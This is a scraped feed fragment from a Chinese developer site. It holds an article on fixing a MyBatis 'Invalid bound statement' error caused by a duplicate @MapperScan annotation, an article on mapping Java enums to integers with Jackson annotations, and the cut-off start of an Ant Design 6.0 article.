class="article-title" data-v-61fb5e44="">
            困扰我一整天的MyBatis"Invalid bound statement"问题，原来是因为这个不起眼的注解冲突！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1992752269369870/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员小胖
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T06:16:57.000Z" title="Mon Nov 24 2025 06:16:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>看似简单的配置冲突，却让我排查了整整一整天</p>
</blockquote>
<h2 data-id="heading-0">问题起源</h2>
<p>最近在整理一个SpringBoot项目的架构时，遇到了一个典型的MyBatis问题：</p>
<pre><code class="hljs language-java" lang="java">Invalid bound <span class="hljs-title function_">statement</span> <span class="hljs-params">(not found)</span>: com.xx.system.server.dao.SysRoleMapper.pagelist
</code></pre>
<p>这个错误对于MyBatis使用者来说再熟悉不过了。无非就是五种常见原因：</p>
<h2 data-id="heading-1">五种常规排查方案</h2>
<p><strong>第一种：检查namespace是否一致</strong>
确认mapper.xml中的namespace和实际的mapper接口完全一致。</p>
<p><strong>第二种：检查方法名是否匹配</strong>
核对mapper接口中的方法名和mapper.xml中的id标签，都是<code>pagelist</code>，完全匹配。</p>
<p><strong>第三种：检查文件是否被正确构建</strong>
清理maven，重新编译，确认target目录下确实存在对应的mapper.xml文件。</p>
<p><strong>第四种：检查资源文件配置</strong>
确认mybatis-plus的mapper-locations配置正确：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">mybatis-plus:</span>
  <span class="hljs-attr">mapper-locations:</span> <span class="hljs-string">classpath*:mapper/**/*.xml</span>
</code></pre>
<p><strong>第五种：检查Spring配置</strong>
仔细检查了所有相关配置，没有发现明显问题。</p>
<p><strong>然而，当我试完这几种解决方案后 依旧没有解决！</strong></p>
<h2 data-id="heading-2">意外的发现</h2>
<p>在近乎绝望的时候，我无意中查看了项目的启动类<code>BootstrapApplication</code>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@SpringBootApplication</span>
<span class="hljs-meta">@MapperScan("com.xx.system.server.dao")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BootstrapApplication</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        SpringApplication.run(BootstrapApplication.class, args);
    }
}
</code></pre>
<p>然后又查看了MybatisConfig配置类：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@MapperScan("com.xx.system.server.dao")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MybatisConfig</span> {
    <span class="hljs-comment">// MyBatis-Plus 相关配置</span>
}
</code></pre>
<p><strong>问题就出在这里！</strong> 相同的包路径被<code>@MapperScan</code>注解扫描了两次。</p>
<h2 data-id="heading-3">问题根源分析</h2>
<h3 data-id="heading-4">重复扫描的副作用</h3>
<ol>
<li><strong>Bean重复注册</strong>：同一个Mapper接口会被Spring尝试注册两次</li>
<li><strong>Bean名称冲突</strong>：默认情况下，Mapper接口的Bean名称是接口名的首字母小写</li>
<li><strong>Spring Boot 2.1+的严格机制</strong>：Spring Boot 2.1之后默认不允许覆盖Bean定义</li>
</ol>
<h3 data-id="heading-5">为什么会导致"Invalid bound statement"？</h3>
<p>在重复扫描的情况下，虽然应用可能正常启动（取决于Spring配置），但MyBatis在构建Mapper代理时可能会出现混乱，导致部分Mapper方法无法正确绑定到对应的SQL语句。</p>
<h2 data-id="heading-6">解决方案</h2>
<p><strong>保持配置的统一性</strong>，只在一个地方使用<code>@MapperScan</code>：</p>
<h3 data-id="heading-7">方案一：只在启动类中配置（推荐）</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@SpringBootApplication</span>
<span class="hljs-meta">@MapperScan("com.xx.system.server.dao")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BootstrapApplication</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        SpringApplication.run(BootstrapApplication.class, args);
    }
}
</code></pre>
<h3 data-id="heading-8">方案二：只在配置类中配置</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@MapperScan("com.xx.system.server.dao")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MybatisConfig</span> {
    <span class="hljs-comment">// MyBatis-Plus 相关配置</span>
}
</code></pre>
<p>移除另一处的<code>@MapperScan</code>注解即可。</p>
<h2 data-id="heading-9">经验总结</h2>
<ol>
<li><strong>配置统一原则</strong>：相关的配置应该集中管理，避免分散在多处</li>
<li><strong>关注启动类</strong>：检查问题时要特别注意启动类中的注解配置</li>
<li><strong>理解框架机制</strong>：了解Spring Boot版本差异带来的行为变化</li>
<li><strong>代码审查要点</strong>：在代码审查时，要特别注意重复的注解配置</li>
</ol>
<h2 data-id="heading-10">配置建议</h2>
<p>对于MyBatis扫描配置，我个人建议：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">mybatis-plus:</span>
  <span class="hljs-attr">mapper-locations:</span> <span class="hljs-string">classpath*:mapper/**/*.xml</span>
  <span class="hljs-attr">type-aliases-package:</span> <span class="hljs-string">com.xx.system.server.dao.entity</span>
  <span class="hljs-attr">configuration:</span>
    <span class="hljs-attr">map-underscore-to-camel-case:</span> <span class="hljs-literal">true</span>
    <span class="hljs-attr">cache-enabled:</span> <span class="hljs-literal">false</span>
  <span class="hljs-attr">global-config:</span>
    <span class="hljs-attr">db-config:</span>
      <span class="hljs-attr">id-type:</span> <span class="hljs-string">auto</span>
      <span class="hljs-attr">logic-delete-field:</span> <span class="hljs-string">deleted</span>
      <span class="hljs-attr">logic-delete-value:</span> <span class="hljs-number">1</span>
      <span class="hljs-attr">logic-not-delete-value:</span> <span class="hljs-number">0</span>
</code></pre>
<p>并在启动类中统一配置Mapper扫描：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@MapperScan({
    "com.xx.system.server.dao"
})</span>
</code></pre>
<p>希望我的这次排查经历能够帮助到遇到类似问题的开发者，避免在这个问题上浪费不必要的时间！</p>
<p><strong>技术之路，细节决定成败！</strong></p>
<hr/>
<p><strong>关注我，获取更多实用技术干货和实战经验！</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[前后端数据传输: 利用 Jackson 注解实现 Enum 与 int 的双向映射]]></title>    <link>https://juejin.cn/post/7575884229525438500</link>    <guid>https://juejin.cn/post/7575884229525438500</guid>    <pubDate>2025-11-24T06:25:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575884229525438500" data-draft-id="7575884229525340196" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="前后端数据传输: 利用 Jackson 注解实现 Enum 与 int 的双向映射"/> <meta itemprop="keywords" content="后端,Java"/> <meta itemprop="datePublished" content="2025-11-24T06:25:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户030480591263"/> <meta itemprop="url" content="https://juejin.cn/user/3793762867478852"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            前后端数据传输: 利用 Jackson 注解实现 Enum 与 int 的双向映射
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3793762867478852/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户030480591263
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T06:25:44.000Z" title="Mon Nov 24 2025 06:25:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前后端交互：如何优雅处理 Java 枚举与 JSON 数字的自动转换？</h2>
<p>在 Java 后端开发中，我们经常面临一个“数据格式不匹配”的通用问题：</p>
<ul>
<li><strong>数据库/前端</strong>：倾向于使用 <code>int</code>（如 1, 0）或 <code>String</code> 类型的状态码，因为它们传输快、存储小。</li>
<li><strong>后端代码</strong>：倾向于使用 <code>Enum</code>（枚举），因为枚举具备强类型约束，能避免“魔法数字”（Magic Number），提高代码可读性。</li>
</ul>
<p>如果直接返回枚举，默认会输出枚举的英文名称（如 <code>"ENABLE"</code>）；如果前端传数字 <code>1</code>，后端默认又无法自动转成枚举对象。</p>
<p>本文将介绍如何利用 Jackson（Spring Boot 默认的 JSON 框架）的两个核心注解 <code>@JsonValue</code> 和 <code>@JsonCreator</code>，实现<strong>枚举对象</strong>与<strong>JSON数值</strong>的无缝双向转换。</p>
<h3 data-id="heading-1">1. 场景复现：最简状态枚举</h3>
<p>我们以最基础的“通用状态”为例。假设我们定义了一个包含 <code>code</code> 属性的枚举：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.enums;

<span class="hljs-keyword">import</span> com.fasterxml.jackson.annotation.JsonCreator;
<span class="hljs-keyword">import</span> com.fasterxml.jackson.annotation.JsonValue;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">CommonStatus</span> {
    
    DISABLE(<span class="hljs-number">0</span>, <span class="hljs-string">"禁用"</span>),
    ENABLE(<span class="hljs-number">1</span>, <span class="hljs-string">"启用"</span>);

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> code;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String desc;

    CommonStatus(<span class="hljs-type">int</span> code, String desc) {
        <span class="hljs-built_in">this</span>.code = code;
        <span class="hljs-built_in">this</span>.desc = desc;
    }

    <span class="hljs-comment">// ... 下面是核心代码 ...</span>
}
</code></pre>
<h3 data-id="heading-2">2. 知识点详解</h3>
<h4 data-id="heading-3">2.1 序列化难题：如何让 Enum 变成 int？</h4>
<p><strong>问题</strong>：默认情况下，<code>CommonStatus.ENABLE</code> 序列化成 JSON 是 <code>"ENABLE"</code>。但前端往往需要数字 <code>1</code>。</p>
<p><strong>解决方案</strong>：使用 <strong><code>@JsonValue</code></strong>。</p>
<p><strong>原理</strong>：该注解标记的方法，其返回值将作为整个对象序列化后的结果。</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-comment">/**
     * 序列化 (Java -&gt; JSON)
     * 标记此方法后，Jackson 会将枚举序列化为 code 的值 (0 或 1)
     * 而不是枚举的名字 ("DISABLE" 或 "ENABLE")
     */</span>
    <span class="hljs-meta">@JsonValue</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getCode</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> code;
    }
</code></pre>
<h4 data-id="heading-4">2.2 反序列化难题：如何让 int/String 变成 Enum？</h4>
<p><strong>问题</strong>：前端传 JSON <code>{"status": 1}</code> 或 <code>{"status": "1"}</code>。Jackson 默认是按照枚举的“名字”去匹配的，找不到名字叫 <code>"1"</code> 的枚举项，就会报错。</p>
<p><strong>解决方案</strong>：使用 <strong><code>@JsonCreator</code></strong>。</p>
<p><strong>原理</strong>：该注解标记的<strong>静态方法</strong>（Static Method）将作为对象的“构造工厂”。Jackson 会把 JSON 中的值传给这个方法，由开发者自定义逻辑返回对应的枚举对象。</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-comment">/**
     * 反序列化 (JSON -&gt; Java)
     * 静态工厂方法：自定义解析逻辑
     * 
     * 技巧：参数使用 String 类型，可以同时兼容前端传 Number(1) 和 String("1")
     */</span>
    <span class="hljs-meta">@JsonCreator</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CommonStatus <span class="hljs-title function_">fromCode</span><span class="hljs-params">(String value)</span> {
        <span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span> || value.trim().isEmpty()) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        }

        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 1. 将输入值转为 int</span>
            <span class="hljs-type">int</span> <span class="hljs-variable">targetCode</span> <span class="hljs-operator">=</span> Integer.parseInt(value);

            <span class="hljs-comment">// 2. 遍历枚举找到匹配的 code</span>
            <span class="hljs-keyword">for</span> (CommonStatus status : CommonStatus.values()) {
                <span class="hljs-keyword">if</span> (status.code == targetCode) {
                    <span class="hljs-keyword">return</span> status;
                }
            }
        } <span class="hljs-keyword">catch</span> (NumberFormatException e) {
            <span class="hljs-comment">// 非数字字符串处理</span>
        }

        <span class="hljs-comment">// 3. 找不到匹配项，抛出异常提示参数错误</span>
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"Invalid status code: "</span> + value);
    }
</code></pre>
<h3 data-id="heading-5">3. 为什么这么做？（总结）</h3>
<p>通过这两个注解的组合，我们达成了以下效果：</p>
<ol>
<li><strong>对外（前端/数据库）</strong>：接口表现为简单的<strong>数字</strong>（Integer），符合通用的接口规范，传输效率高。</li>
<li><strong>对内（Java逻辑）</strong>：代码中完全使用<strong>枚举对象</strong>，享受强类型检查、switch-case 支持和方法封装的优势。</li>
<li><strong>鲁棒性</strong>：在 <code>fromCode</code> 方法中，我们兼容了字符串和数字的输入，极大地提高了接口的容错能力。</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[🎉 Ant Design 6.0 来了！这一次它终于想通了什么？]]></title>    <link>https://juejin.cn/post/7575810396202287138</link>    <guid>https://juejin.cn/post/7575810396202287138</guid>    <pubDate>2025-11-24T06:58:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575810396202287138" data-draft-id="7576077034745511988" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="🎉 Ant Design 6.0 来了！这一次它终于想通了什么？"/> <meta itemprop="keywords" content="前端,JavaScript,Ant Design"/> <meta itemprop="datePublished" content="2025-11-24T06:58:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ErpanOmer"/> <meta itemprop="url" content="https://juejin.cn/user/3878732754331096"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            🎉 Ant Design 6.0 来了！这一次它终于想通了什么？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3878732754331096/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ErpanOmer
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T06:58:32.000Z" title="Mon Nov 24 2025 06:58:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 